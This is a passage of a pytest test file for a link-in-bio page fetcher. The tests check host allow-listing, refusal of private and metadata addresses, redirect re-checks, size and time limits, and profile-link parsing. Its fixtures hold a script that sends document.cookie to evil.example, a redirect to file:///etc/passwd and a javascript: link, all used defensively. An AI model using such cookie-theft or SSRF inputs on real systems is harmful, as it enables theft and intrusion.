"""Link-in-bio import (biofetch.py, #11): the one page FeedVault fetches.

No test opens a socket: the fetcher's resolver, connect, TLS layer and
clock are fakes here (Net), and the endpoint's FETCHER is replaced. Every
page below is hand-written, not a copy of a real one.
"""
import socket
import ssl

import pytest

from conftest import H

import biofetch

PUBLIC = "93.184.215.14"
PUBLIC6 = "2606:2800:21f:cb07:6820:80da:af6b:8b2c"


@pytest.fixture(autouse=True)
def fresh_guard(monkeypatch):
    """Each test starts with no fetch behind it (the MIN_GAP guard)."""
    monkeypatch.setattr(biofetch, "_last", [None])


class Clock:
    def __init__(self):
        self.t = 1000.0

    def __call__(self):
        return self.t


def html_answer(body=b"<html><body>hi</body></html>", status="200 OK", headers=None, length=True):
    head = {"Content-Type": "text/html; charset=utf-8"}
    if length:
        head["Content-Length"] = str(len(body))
    head.update(headers or {})
    lines = [f"HTTP/1.1 {status}"] + [f"{k}: {v}" for k, v in head.items() if v is not None]
    return ("\r\n".join(lines) + "\r\n\r\n").encode() + body


def redirect(location, status="302 Found"):
    return html_answer(b"", status=status, headers={"Location": location})


class FakeSock:
    """A connected socket (and its TLS layer, the fake wrap returns it): the
    answer the Net has for the request sent, in ``chunk``-byte pieces, each
    taking ``delay`` seconds of the fake clock."""

    def __init__(self, net, family, sockaddr):
        self.net, self.family, self.sockaddr = net, family, sockaddr
        self.sent, self.timeouts, self.host, self.closed = b"", [], None, False
        self.out = None

    def settimeout(self, t):
        assert t is None or t > 0
        self.timeouts.append(t)

    def sendall(self, data):
        self.sent += data
        if b"\r\n\r\n" in self.sent and self.out is None:
            path = self.sent.split(b" ", 2)[1].decode()
            answer = self.net.pages.get((self.host, path))
            assert answer is not None, f"no page for {self.host}{path}"
            self.out = answer() if callable(answer) else answer

    def recv(self, n):
        if self.net.recv_error:
            raise self.net.recv_error
        left = self.timeouts[-1] if self.timeouts else None
        if left is not None and self.net.delay > left:      # as a real socket would: no data in time
            self.net.clock.t += left
            raise socket.timeout("timed out")
        self.net.clock.t += self.net.delay
        n = min(n, self.net.chunk)
        piece, self.out = self.out[:n], self.out[n:]
        return piece

    def close(self):
        self.closed = True


class Net:
    """The fake network: DNS answers, pages by (host, path), and a record
    of every lookup, connect and TLS host name."""

    def __init__(self, dns=None, pages=None):
        self.dns = {"linktr.ee": [PUBLIC], **(dns or {})}
        self.pages = pages or {}
        self.clock = Clock()
        self.lookups, self.connects, self.tls = [], [], []
        self.delay, self.chunk, self.recv_error = 0.0, 1 << 20, None
        self.socks = []

    def resolve(self, host, port, timeout):
        assert port == 443 and timeout > 0
        self.lookups.append(host)
        out = []
        for ip in self.dns.get(host, []):
            if ":" in ip:
                out.append((socket.AF_INET6, (ip, port, 0, 0)))
            else:
                out.append((socket.AF_INET, (ip, port)))
        return out

    def connect(self, family, sockaddr, timeout):
        assert timeout > 0
        self.connects.append(sockaddr[0])
        s = FakeSock(self, family, sockaddr)
        self.socks.append(s)
        return s

    def wrap(self, sock, host):
        self.tls.append((sock.sockaddr[0], host))
        sock.host = host
        return sock

    def fetcher(self, **kw):
        return biofetch.Fetcher(resolve=self.resolve, connect=self.connect, wrap=self.wrap, clock=self.clock, **kw)

    def get(self, url, **kw):
        return self.fetcher(**kw).fetch(url)


def refused(net, url, **kw):
    with pytest.raises(biofetch.Refused) as e:
        net.get(url, **kw)
    return str(e.value)


# ---------------------------------------------------------------------------
# The link
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("url, error", [
    ("http://linktr.ee/alice", "only https links"),
    ("ftp://linktr.ee/alice", "only https links"),
    ("https://linktr.ee:8443/alice", "only https's own port"),
    ("https://linktr.ee:80/alice", "only https's own port"),
    ("https://user:pw@linktr.ee/alice", "login part"),
    ("https://linktr.ee@evil.example/alice", "login part"),
    ("https://evil.example/alice", "not an allowed site: evil.example"),
    ("https://linktr.ee.evil.example/alice", "not an allowed site"),
    ("https://evil.linktr.ee/alice", "not an allowed site"),           # no subdomains
    ("https://xlinktr.ee/alice", "not an allowed site"),
    ("https://lіnktr.ee/alice", "not an allowed site: xn--"),     # a Cyrillic look-alike
    ("https://xn--lnktr-3ve.ee/alice", "not an allowed site"),
    ("https://93.184.215.14/alice", "not an allowed site"),
    ("https://[::1]/alice", "not an allowed site"),
    ("https://linktr.ee../alice", "not an allowed site"),
    ("https://linktr.ee/al ice", "spaces or control characters"),
    ("https://linktr.ee/al\tice", "spaces or control characters"),
    ("https://linktr.ee/al\x00ice", "spaces or control characters"),
    ("https://linktr.ee/al\x7fice", "spaces or control characters"),
    ("https://linktr.ee\\@evil.example/", "spaces or control characters"),
    ("https://linktr.ee/", "not the site's home page"),
    ("https://linktr.ee", "not the site's home page"),
    ("", "paste a link-in-bio page's link"),
    ("https://" + "a" * 2000, "too long"),
    ("https://linktr.ee:99999/a", "not a link"),
])
def test_links_refused_before_anything_is_looked_up(url, error):
    net = Net()
    assert error in refused(net, url)
    assert net.lookups == net.connects == []


@pytest.mark.parametrize("url", [
    "https://linktr.ee/alice", "linktr.ee/alice", "https://LINKTR.EE/alice", "https://linktr.ee./alice",
    "https://www.linktr.ee/alice", "https://ｌｉｎｋｔｒ.ｅｅ/alice",   # fullwidth
    "https://linktr.ee:443/alice", "  https://linktr.ee/alice  ",
])
def test_allowed_forms_of_an_allowed_host(url):
    net = Net(pages={("linktr.ee", "/alice"): html_answer()})
    page = net.get(url)
    assert page.url == "https://linktr.ee/alice" and "hi" in page.text
    assert net.lookups == ["linktr.ee"] and net.tls == [(PUBLIC, "linktr.ee")]


def test_every_allowed_site_has_a_reason_and_is_a_plain_host():
    for host, why in biofetch.SITES.items():
        assert why and biofetch._host(host) == host and not host.startswith("www.")


# ---------------------------------------------------------------------------
# Addresses
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("address", [
    "127.0.0.1", "10.0.0.1", "172.16.5.4", "192.168.1.1", "169.254.169.254", "100.64.0.1", "0.0.0.0",
    "224.0.0.1", "239.255.255.250", "255.255.255.255", "198.18.0.1", "192.0.2.1", "240.0.0.1",
    "::1", "::", "fe80::1", "fe80::1%eth0", "fc00::1", "fd12:3456::1", "ff02::1", "ff0e::1", "2001:db8::1",
    "::ffff:127.0.0.1", "::ffff:93.184.215.14",             # mapped: refused even to a public IPv4
    "::127.0.0.1", "64:ff9b::7f00:1", "64:ff9b::808:808", "2002:7f00:1::1", "2002:5db8:d70e::1",
    "2001:0:4136:e378:8000:63bf:3fff:fdd2",                 # Teredo
    "not an address",
])
def test_addresses_that_are_not_public(address):
    assert not biofetch.public(address)
    net = Net(dns={"linktr.ee": [address]})
    assert "address is not public" in refused(net, "https://linktr.ee/alice")
    assert net.connects == []


@pytest.mark.parametrize("address", [PUBLIC, PUBLIC6, "8.8.8.8", "2a00:1450:4001:80b::200e"])
def test_public_addresses(address):
    assert biofetch.public(address)


def test_one_public_and_one_private_address_is_refused():
    for dns in ([PUBLIC, "10.0.0.7"], ["10.0.0.7", PUBLIC], [PUBLIC6, "::1"]):
        net = Net(dns={"linktr.ee": dns})
        assert "address is not public" in refused(net, "https://linktr.ee/alice")
        assert net.connects == []


def test_no_address():
    net = Net(dns={"linktr.ee": []})
    assert "no address found" in refused(net, "https://linktr.ee/alice")


def test_it_connects_to_the_checked_address_with_tls_on_the_name():
    """One lookup per hop, the connection to an address from it (never a
    second lookup the DNS could answer differently), TLS sent the host name."""
    answers = iter([[PUBLIC], ["127.0.0.1"]])                # a rebinding DNS: public, then loopback

    net = Net(pages={("linktr.ee", "/alice"): html_answer()})
    net.dns = {}
    net.resolve = lambda host, port, timeout: (net.lookups.append(host) or
                                               [(socket.AF_INET, (ip, port)) for ip in next(answers)])
    net.get("https://linktr.ee/alice")
    assert net.lookups == ["linktr.ee"]
    assert net.connects == [PUBLIC] and net.tls == [(PUBLIC, "linktr.ee")]
    assert net.socks[0].sockaddr == (PUBLIC, 443)


def test_the_next_checked_address_when_one_does_not_answer():
    net = Net(dns={"linktr.ee": [PUBLIC6, PUBLIC]}, pages={("linktr.ee", "/alice"): html_answer()})
    connect = net.connect

    def refuse_v6(family, sockaddr, timeout):
        if family == socket.AF_INET6:
            net.connects.append(sockaddr[0])
            raise ConnectionRefusedError(111, "Connection refused")
        return connect(family, sockaddr, timeout)
    net.connect = refuse_v6
    net.get("https://linktr.ee/alice")
    assert net.connects == [PUBLIC6, PUBLIC] and net.lookups == ["linktr.ee"]


def test_nothing_answers():
    net = Net()

    def refuse(family, sockaddr, timeout):
        raise ConnectionRefusedError(111, "Connection refused")
    net.connect = refuse
    assert "could not reach linktr.ee: Connection refused" in refused(net, "https://linktr.ee/alice")


def test_the_real_tls_layer_checks_the_certificate_and_name():
    ctx = biofetch.tls_context()
    assert ctx.check_hostname and ctx.verify_mode == ssl.CERT_REQUIRED
    assert ctx.minimum_version >= ssl.TLSVersion.TLSv1_2


def test_certificate_errors_are_refused():
    net = Net()

    def bad_cert(sock, host):
        raise ssl.SSLCertVerificationError("certificate verify failed: Hostname mismatch")
    net.wrap = bad_cert
    assert refused(net, "https://linktr.ee/alice") == "linktr.ee's certificate is not valid"
    assert net.socks[0].closed


# ---------------------------------------------------------------------------
# What is sent: nothing from the environment
# ---------------------------------------------------------------------------

def test_the_request_has_no_proxy_cookie_auth_or_referer(monkeypatch, tmp_path):
    for var in ("HTTPS_PROXY", "https_proxy", "HTTP_PROXY", "http_proxy", "ALL_PROXY", "all_proxy"):
        monkeypatch.setenv(var, "http://10.9.9.9:3128")
    monkeypatch.setenv("NO_PROXY", "")
    import os
    with open(os.path.join(os.environ["HOME"], ".netrc"), "w") as f:
        f.write("machine linktr.ee login alice password secret\n")
    net = Net(pages={("linktr.ee", "/alice?x=1"): html_answer()})
    net.get("https://linktr.ee/alice?x=1#frag")
    assert net.connects == [PUBLIC]                          # not the proxy
    sent = net.socks[0].sent.decode()
    head = sent.split("\r\n")
    assert head[0] == "GET /alice?x=1 HTTP/1.1"
    names = {line.split(":", 1)[0].lower() for line in head[1:] if line}
    assert names == {"host", "user-agent", "accept", "accept-encoding", "connection"}
    assert "Host: linktr.ee" in head and "Accept-Encoding: identity" in head and "Connection: close" in head
    assert any(line.startswith("User-Agent: FeedVault/") for line in head)
    assert "secret" not in sent and "frag" not in sent


def test_odd_path_characters_are_percent_encoded():
    net = Net(pages={("linktr.ee", "/%C3%A9l%22e"): html_answer()})
    page = net.get('https://linktr.ee/él"e')
    assert page.url == "https://linktr.ee/%C3%A9l%22e"


# ---------------------------------------------------------------------------
# Redirects
# ---------------------------------------------------------------------------

def test_redirects_are_followed_and_each_checked_again():
    net = Net(dns={"beacons.ai": [PUBLIC6]}, pages={
        ("linktr.ee", "/a"): redirect("/b", "301 Moved Permanently"),
        ("linktr.ee", "/b"): redirect("https://beacons.ai/c"),
        ("beacons.ai", "/c"): redirect("https://www.beacons.ai/d", "308 Permanent Redirect"),
        ("beacons.ai", "/d"): html_answer(b"<p>done</p>"),
    })
    page = net.get("https://linktr.ee/a")
    assert page.url == "https://beacons.ai/d" and "done" in page.text
    assert net.lookups == ["linktr.ee", "linktr.ee", "beacons.ai", "beacons.ai"]
    assert net.tls == [(PUBLIC, "linktr.ee")] * 2 + [(PUBLIC6, "beacons.ai")] * 2


def test_too_many_redirects():
    pages = {("linktr.ee", f"/{i}"): redirect(f"/{i + 1}") for i in range(5)}
    net = Net(pages=pages)
    assert refused(net, "https://linktr.ee/0") == "too many redirects"
    assert len(net.connects) == 4                            # the page and 3 redirects, no fifth request


@pytest.mark.parametrize("location, error", [
    ("https://evil.example/x", "not an allowed site"),
    ("http://linktr.ee/x", "only https links"),
    ("https://linktr.ee:8080/x", "port"),
    ("//evil.example/x", "not an allowed site"),
    ("https://a@linktr.ee/x", "login part"),
    ("https://beacons.ai/private", "address is not public"),
    ("file:///etc/passwd", "only https links"),
])
def test_a_redirect_to_somewhere_refused(location, error):
    net = Net(dns={"beacons.ai": ["192.168.0.10"]}, pages={("linktr.ee", "/a"): redirect(location)})
    message = refused(net, "https://linktr.ee/a")
    assert error in message and ("redirects elsewhere" in message or "not public" in message)
    assert net.connects == [PUBLIC]


def test_a_redirect_with_nowhere_to_go():
    net = Net(pages={("linktr.ee", "/a"): html_answer(b"", status="302 Found")})
    assert "nowhere to go" in refused(net, "https://linktr.ee/a")


# ---------------------------------------------------------------------------
# The answer
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("answer, error", [
    (html_answer(status="404 Not Found"), "the site answered 404"),
    (html_answer(status="500 Oops"), "the site answered 500"),
    (html_answer(status="304 Not Modified"), "the site answered 304"),
    (html_answer(headers={"Content-Type": "application/json"}), "not a web page (application/json)"),
    (html_answer(headers={"Content-Type": None}), "not a web page (no type)"),
    (html_answer(headers={"Content-Type": "text/htmlx"}), "not a web page"),
    (html_answer(headers={"Content-Encoding": "gzip"}), "compressed"),
    (html_answer(headers={"Content-Encoding": "br"}), "compressed"),
    (html_answer(headers={"Transfer-Encoding": "gzip, chunked"}, length=False), "encoding that is refused"),
    (b"SSH-2.0-OpenSSH\r\n\r\n", "not HTTP"),
    (b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n", "closed the connection early"),
    (b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 50\r\n\r\nshort", "cut short"),
    (b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: -1\r\n\r\n", "malformed"),
    (b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: \xb2\r\n\r\nab", "malformed"),
    (b"HTTP/1.1 200 OK\r\nContent-Length: 1\r\nContent-Length: 2\r\nContent-Type: text/html\r\n\r\nab",
     "malformed"),
    (b"HTTP/1.1 200 OK\r\n bad: fold\r\n\r\n", "malformed"),
    (b"HTTP/1.1 200 OK\r\n" + b"X-A: b\r\n" * 101 + b"\r\n", "too many headers"),
    (b"HTTP/1.1 200 OK\r\nX: " + b"a" * 40000 + b"\r\n\r\n", "malformed"),
])
def test_answers_refused(answer, error):
    net = Net(pages={("linktr.ee", "/a"): answer})
    assert error in refused(net, "https://linktr.ee/a")
    assert all(s.closed for s in net.socks)


def test_too_large_with_a_length():
    big = b"x" * 3000
    net = Net(pages={("linktr.ee", "/a"): html_answer(big)})
    assert refused(net, "https://linktr.ee/a", max_bytes=2000) == "page too large"


def test_too_large_counted_while_reading():
    """No length: read until the site closes, refused as soon as it is past
    the limit, without reading the rest."""
    sent = {"n": 0}

    def endless():
        sent["n"] += 1
        return html_answer(b"y" * 100_000, length=False)
    net = Net(pages={("linktr.ee", "/a"): endless})
    net.chunk = 1000
    assert refused(net, "https://linktr.ee/a", max_bytes=5000) == "page too large"
    assert len(net.socks[0].out) > 90_000                    # most of it never read


def test_too_large_chunked():
    body = b"".join(b"3e8\r\n" + b"z" * 1000 + b"\r\n" for _ in range(10)) + b"0\r\n\r\n"
    net = Net(pages={("linktr.ee", "/a"): html_answer(body, headers={"Transfer-Encoding": "chunked"}, length=False)})
    assert refused(net, "https://linktr.ee/a", max_bytes=5000) == "page too large"


def test_the_default_limits():
    f = biofetch.Fetcher()
    assert (f.timeout, f.max_bytes, f.max_redirects) == (10, 2 * 1024 * 1024, 3)


def test_chunked_and_charset():
    body = "<p>café</p>".encode("latin-1")
    chunked = b"%x;ext=1\r\n%s\r\n0\r\nX-Trailer: 1\r\n\r\n" % (len(body), body)
    net = Net(pages={("linktr.ee", "/a"): html_answer(chunked, length=False, headers={
        "Transfer-Encoding": "chunked", "Content-Type": "text/html; charset=ISO-8859-1"})})
    net.chunk = 3                                            # in small pieces
    assert net.get("https://linktr.ee/a").text == "<p>café</p>"


def test_until_close_and_odd_charset():
    net = Net(pages={("linktr.ee", "/a"): html_answer(b"<p>ok \xff</p>", length=False, headers={
        "Content-Type": "TEXT/HTML; charset=no-such-charset"})})
    assert net.get("https://linktr.ee/a").text == "<p>ok �</p>"


# ---------------------------------------------------------------------------
# Time: one limit for the whole fetch
# ---------------------------------------------------------------------------

def test_a_slow_drip_times_out_on_the_total():
    """A byte at a time, each well within any per-read limit: the whole
    fetch still stops at the total time."""
    net = Net(pages={("linktr.ee", "/a"): html_answer(b"d" * 500)})
    net.chunk, net.delay = 1, 0.5
    assert refused(net, "https://linktr.ee/a") == "timed out"
    assert net.clock.t - 1000 <= 10.5
    timeouts = net.socks[0].timeouts
    assert timeouts == sorted(timeouts, reverse=True) and max(timeouts) <= 10   # each read: the time left


def test_slow_headers_time_out_too():
    net = Net(pages={("linktr.ee", "/a"): b"HTTP/1.1 200 OK\r\n" + b"X-Slow: 1\r\n" * 90})
    net.chunk, net.delay = 4, 0.2
    assert refused(net, "https://linktr.ee/a") == "timed out"


def test_slow_redirects_share_the_limit():
    pages = {("linktr.ee", f"/{i}"): redirect(f"/{i + 1}") for i in range(3)}
    pages["linktr.ee", "/3"] = html_answer()
    net = Net(pages=pages)
    net.delay = 3                                            # each hop's answer is one 3 s read: 4 hops, 12 s
    assert refused(net, "https://linktr.ee/0") == "timed out"


def test_a_socket_timeout_is_timed_out():
    net = Net(pages={("linktr.ee", "/a"): html_answer()})
    net.recv_error = socket.timeout("timed out")
    assert refused(net, "https://linktr.ee/a") == "timed out"


def test_a_slow_lookup_times_out(monkeypatch):
    import threading
    release = threading.Event()

    def slow(*a, **kw):
        release.wait(5)
        return []
    monkeypatch.setattr(socket, "getaddrinfo", slow)
    try:
        with pytest.raises(socket.timeout):
            biofetch.system_resolve("linktr.ee", 443, 0.05)
    finally:
        release.set()


def test_the_system_lookup_asks_for_tcp_on_443(monkeypatch):
    asked = []

    def fake(host, port, **kw):
        asked.append((host, port, kw))
        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", (PUBLIC, 443))]
    monkeypatch.setattr(socket, "getaddrinfo", fake)
    assert biofetch.system_resolve("linktr.ee", 443, 1) == [(socket.AF_INET, (PUBLIC, 443))]
    assert asked == [("linktr.ee", 443, {"type": socket.SOCK_STREAM, "proto": socket.IPPROTO_TCP})]


def test_the_system_connect_uses_the_address_it_is_given(monkeypatch):
    made = []

    class Raw:
        def __init__(self, family, kind):
            self.calls = [("new", family, kind)]
            made.append(self)

        def settimeout(self, t):
            self.calls.append(("timeout", t))

        def connect(self, address):
            self.calls.append(("connect", address))

        def close(self):
            self.calls.append(("close",))
    monkeypatch.setattr(socket, "socket", Raw)
    monkeypatch.setattr(socket, "getaddrinfo", lambda *a, **kw: pytest.fail("looked up"))
    biofetch.system_connect(socket.AF_INET6, (PUBLIC6, 443, 0, 0), 4.5)
    assert made[0].calls == [("new", socket.AF_INET6, socket.SOCK_STREAM), ("timeout", 4.5),
                             ("connect", (PUBLIC6, 443, 0, 0))]


# ---------------------------------------------------------------------------
# One at a time, a few seconds apart
# ---------------------------------------------------------------------------

def test_one_fetch_at_a_time_and_a_gap(monkeypatch):
    net = Net(pages={("linktr.ee", "/a"): html_answer()})
    monkeypatch.setattr(biofetch, "FETCHER", net.fetcher())
    clock = Clock()
    assert biofetch.fetch("https://linktr.ee/a", clock=clock).text
    clock.t += 1
    with pytest.raises(biofetch.Refused) as e:
        biofetch.fetch("https://linktr.ee/a", clock=clock)
    assert e.value.status == 429 and "between two imports" in str(e.value)
    # A link refused before anything is fetched neither waits nor counts.
    with pytest.raises(biofetch.Refused) as e:
        biofetch.fetch("https://evil.example/a", clock=clock)
    assert e.value.status == 400
    clock.t += biofetch.MIN_GAP
    assert biofetch.fetch("https://linktr.ee/a", clock=clock).text
    assert len(net.connects) == 2
    clock.t += 100
    with biofetch._busy:                                     # another one under way
        with pytest.raises(biofetch.Refused) as e:
            biofetch.fetch("https://linktr.ee/a", clock=clock)
    assert e.value.status == 429 and "another" in str(e.value)
    assert len(net.connects) == 2


# ---------------------------------------------------------------------------
# The switch
# ---------------------------------------------------------------------------

def test_the_switch_is_off_by_default_and_saved_with_the_settings(env, client):
    assert client.get("/api/config", headers=H).get_json()["bio_import"] is False
    r = client.post("/api/config", json={"bio_import": "yes"}, headers=H).get_json()
    assert r["ok"] is False and "bio_import" in r["error"]
    assert client.post("/api/config", json={"bio_import": True}, headers=H).get_json()["ok"]
    assert client.get("/api/config", headers=H).get_json()["bio_import"] is True
    import config
    assert config.load()["bio_import"] is True and biofetch.enabled(config.load())
    client.post("/api/config", json={"bio_import": False}, headers=H)
    assert not biofetch.enabled(config.load())


# ---------------------------------------------------------------------------
# Parsing (hand-written pages, shaped like what these sites serve)
# ---------------------------------------------------------------------------

ROUTES = {"instagram.com": "instaloader", "x.com": "gallery-dl", "twitter.com": "gallery-dl",
          "youtube.com": "yt-dlp", "tiktok.com": "yt-dlp", "bsky.app": "gallery-dl"}

# A Next.js link page: the links are in __NEXT_DATA__, the anchors drawn by
# its scripts (which never run here).
NEXT_PAGE = """<!DOCTYPE html><html><head><title>Alice | Linktree</title>
<script>window.evil = function () { fetch("https://evil.example/" + document.cookie) }</script>
<script id="__NEXT_DATA__" type="application/json">
{"props": {"pageProps": {"account": {"username": "alice",
  "socialLinks": [{"type": "INSTAGRAM", "url": "https://www.instagram.com/alice.example/"},
                  {"type": "TIKTOK", "url": "https://www.tiktok.com/@new.one?lang=en"}],
  "links": [{"title": "My shop", "url": "https://shop.example/alice"},
            {"title": "X", "url": "https://x.com/Example_User1"},
            {"title": "Videos", "url": "https://www.youtube.com/@alicevids/videos"},
            {"title": "Latest", "url": "https://www.youtube.com/watch?v=abc"},
            {"title": "Report", "url": "https://linktr.ee/s/about/trust-center/report"},
            {"title": "nested", "deep": [[{"u": "HTTPS://bsky.app/profile/alice.bsky.social"}]]},
            {"title": "not a link", "url": "instagram.com/notalink"}]}}}}
</script></head><body><div id="__next"></div></body></html>"""

ANCHOR_PAGE = """<html><body>
<a href="https://instagram.com/alice.example">Instagram</a>
<a href="https://www.instagram.com/alice.example/">Instagram again</a>
<a href="https://x.com/example_user1/status/123">a post</a>
<a href="https://twitter.com/example_user1">X</a>
<a href="https://www.instagram.com/p/C8xYz/">a post</a>
<a href="https://x.com/intent/follow?screen_name=alice">follow</a>
<a href="https://tiktok.com/new.one">no @</a>
<a href="mailto:alice@example.com">mail</a><a href="javascript:alert(1)">js</a><a href="/relative">rel</a>
<area href="https://bsky.app/profile/alice.bsky.social">
<a href="https://www.youtube.com/channel/UC1234567890abcdefghij/">channel</a>
<a href="https://www.instagram.com/alice&#46;example/">entity</a>
</body></html>"""


def test_links_from_next_data():
    links = biofetch.page_links(NEXT_PAGE)
    assert "https://evil.example/" not in " ".join(links)              # script text is never read
    assert "instagram.com/notalink" not in links
    assert "HTTPS://bsky.app/profile/alice.bsky.social" in links
    r = {(p[0], p[1]) for p in filter(None, (biofetch.profile(link, ROUTES) for link in links))}
    assert r == {("instagram", "alice.example"), ("tiktok", "new.one"), ("twitter", "Example_User1"),
                 ("youtube", "alicevids"), ("bluesky", "alice.bsky.social")}


def test_links_from_anchors_and_what_is_not_a_profile():
    links = biofetch.page_links(ANCHOR_PAGE)
    assert not any(link.startswith(("mailto", "javascript", "/")) for link in links)
    found = [biofetch.profile(link, ROUTES) for link in links]
    profiles = [(f[0], f[1]) for f in found if f]
    assert profiles == [("instagram", "alice.example"), ("instagram", "alice.example"),
                        ("twitter", "example_user1"), ("bluesky", "alice.bsky.social"),
                        ("youtube", "UC1234567890abcdefghij")]    # the &#46; one is the first, unescaped
    refused = [link for link, f in zip(links, found) if not f]
    assert refused == ["https://x.com/example_user1/status/123", "https://www.instagram.com/p/C8xYz/",
                       "https://x.com/intent/follow?screen_name=alice", "https://tiktok.com/new.one"]


@pytest.mark.parametrize("text", [
    "", "<html>", "no markup at all", "<a href=", "<a href='https://x.com/a'", "<<<>>><!--", "<!", "<![CDATA[",
    "<script id=__NEXT_DATA__>{not json", '<script type="application/json">' + "[" * 100000,
    "\x00\x01<a href='https://x.com/ok'>", "<a href=\"https://x.com/fine\"><b><i></a></b>",
])
def test_malformed_pages_give_what_they_can(text):
    links = biofetch.page_links(text)
    assert links in ([], ["https://x.com/ok"], ["https://x.com/fine"])


def test_links_are_bounded():
    page = "".join(f'<a href="https://x.com/u{i}">' for i in range(5000))
    assert len(biofetch.page_links(page)) == biofetch.MAX_LINKS
    blob = '<script type="application/json">' + json_list(300_000) + "</script>"
    assert len(biofetch.page_links(blob)) < 300_000


def json_list(n):
    import json
    return json.dumps(["https://x.com/j%d" % i for i in range(n)])


# ---------------------------------------------------------------------------
# The endpoint, end to end with a fake fetcher
# ---------------------------------------------------------------------------

def bio_net(page, path="/alice"):
    return Net(pages={("linktr.ee", path): html_answer(page.encode())})


@pytest.fixture
def bio(env, client, monkeypatch):
    """Alice (alice.example linked), Bob (bob.example), X example_user1 and
    TikTok example_user6 indexed and linked to nobody; the switch on."""
    from test_people import archive, account, create, post
    archive(env)
    alice = create(client, "Alice", account(client, "instagram", "alice.example"))["person"]
    create(client, "Bob", account(client, "instagram", "bob.example"))
    post(client, "/api/config", {"bio_import": True})
    monkeypatch.setattr(biofetch, "MIN_GAP", 0)
    return alice


def bio_import(client, pid, url="https://linktr.ee/alice", status=200, headers=H):
    r = client.post(f"/api/people/{pid}/bio-import", json={"url": url}, headers=headers)
    assert r.status_code == status, r.get_json()
    return r.get_json()


def test_import_end_to_end(bio, client, monkeypatch):
    from test_people import post
    post(client, "/api/sources", {"target": "https://bsky.app/profile/alice.bsky.social"})   # a source of nobody
    net = bio_net(NEXT_PAGE + ANCHOR_PAGE)
    monkeypatch.setattr(biofetch, "FETCHER", net.fetcher())
    r = bio_import(client, bio["id"])
    assert r["ok"] and r["url"] == "https://linktr.ee/alice"
    got = {(a["platform"], a["handle"]): a for a in r["accounts"]}
    assert {k: a["status"] for k, a in got.items()} == {
        ("instagram", "alice.example"): "linked", ("tiktok", "new.one"): "new",
        ("twitter", "example_user1"): "indexed", ("youtube", "alicevids"): "new",
        ("bluesky", "alice.bsky.social"): "source", ("youtube", "UC1234567890abcdefghij"): "new"}
    # Anchors come first: twitter.com/example_user1, and x.com/Example_User1 from the JSON is the same one.
    x = got["twitter", "example_user1"]
    assert x["account"]["id"] == "641286" and x["person"] is None and x["url"] == "https://twitter.com/example_user1"
    assert got["instagram", "alice.example"]["person"] == {"id": bio["id"], "name": "Alice"}
    assert got["instagram", "alice.example"]["url"] == "https://instagram.com/alice.example"
    assert got["tiktok", "new.one"]["url"] == "https://tiktok.com/@new.one"         # query dropped
    # The link the dashboard shows is FeedVault's own for the platform, or none.
    assert {k: a["profile_url"] for k, a in got.items()} == {
        ("instagram", "alice.example"): "https://www.instagram.com/alice.example/",
        ("tiktok", "new.one"): "https://www.tiktok.com/@new.one", ("twitter", "example_user1"): "https://x.com/example_user1",
        ("youtube", "alicevids"): "https://www.youtube.com/@alicevids", ("bluesky", "alice.bsky.social"): None,
        ("youtube", "UC1234567890abcdefghij"): None}
    # shop.example, the X post, the Instagram post, the intent link, tiktok.com/new.one, the YouTube video
    assert r["other"] == 6
    assert net.connects == [PUBLIC]
    # Nothing was added.
    from test_people import get, links
    assert links() == [("Alice", "instagram", "111"), ("Bob", "instagram", "222")]
    before = len(get(client, "/api/sources")["sources"])
    assert before == 1

    # The user adds two, through the usual calls; the next import says so.
    post(client, f"/api/people/{bio['id']}/accounts", {"add": [{"platform": "twitter", "id": "641286"}]})
    post(client, "/api/sources", {"target": got["tiktok", "new.one"]["url"], "person": bio["id"]})
    r = bio_import(client, bio["id"])
    status = {(a["platform"], a["handle"]): a["status"] for a in r["accounts"]}
    assert status["twitter", "example_user1"] == status["tiktok", "new.one"] == "linked"


def test_an_account_of_someone_else(bio, client, monkeypatch):
    page = '<a href="https://instagram.com/bob.example">bob</a><a href="https://www.tiktok.com/@example_user6">t</a>'
    monkeypatch.setattr(biofetch, "FETCHER", bio_net(page).fetcher())
    r = bio_import(client, bio["id"])
    [bob, tiktok] = r["accounts"]
    assert bob["status"] == "other" and bob["person"]["name"] == "Bob" and bob["account"]["id"] == "222"
    assert tiktok["status"] == "indexed" and tiktok["account"]["handle"] == "example_user6"


def test_an_empty_page(bio, client, monkeypatch):
    monkeypatch.setattr(biofetch, "FETCHER", bio_net("").fetcher())
    assert bio_import(client, bio["id"]) == {"ok": True, "url": "https://linktr.ee/alice", "accounts": [],
                                            "other": 0}


class Untouchable:
    def fetch(self, url):
        raise AssertionError("fetched")


def test_switched_off_nothing_is_fetched(env, client, monkeypatch):
    from test_people import create
    p = create(client, "Alice")["person"]
    monkeypatch.setattr(biofetch, "FETCHER", Untouchable())
    r = bio_import(client, p["id"], status=403)
    assert r == {"ok": False, "error": "link-in-bio import is off: turn it on in Settings → Downloads"}


def test_refusals_from_the_endpoint(bio, client, monkeypatch):
    monkeypatch.setattr(biofetch, "FETCHER", Untouchable())
    assert bio_import(client, 999, status=404)["error"] == "no such person"
    for body in (None, {}, {"url": 3}, {"url": "https://linktr.ee/a", "extra": 1}, ["https://linktr.ee/a"]):
        r = client.post(f"/api/people/{bio['id']}/bio-import", json=body, headers=H)
        assert r.status_code == 400
    assert "not an allowed site" in bio_import(client, bio["id"], "https://evil.example/a", status=400)["error"]
    assert bio_import(client, bio["id"], "http://linktr.ee/a", status=400)["error"] == "only https links"
    for foreign in ({"Origin": "https://www.instagram.com"}, {"Sec-Fetch-Site": "cross-site"}):
        r = bio_import(client, bio["id"], headers={**H, **foreign}, status=403)
        assert "own dashboard" in r["error"]
    r = client.post(f"/api/people/{bio['id']}/bio-import", json={"url": "https://linktr.ee/a"})
    assert r.status_code == 403                                             # no X-FeedVault
    r = client.post(f"/api/people/{bio['id']}/bio-import", json={"url": "https://linktr.ee/a"}, headers={**H, "Host": "evil.example"})
    assert r.status_code == 403 and r.get_json()["error"] == "forbidden host"


def test_a_failed_fetch_is_a_502_with_its_reason(bio, client, monkeypatch, capsys):
    net = Net(dns={"linktr.ee": ["10.0.0.1"]})
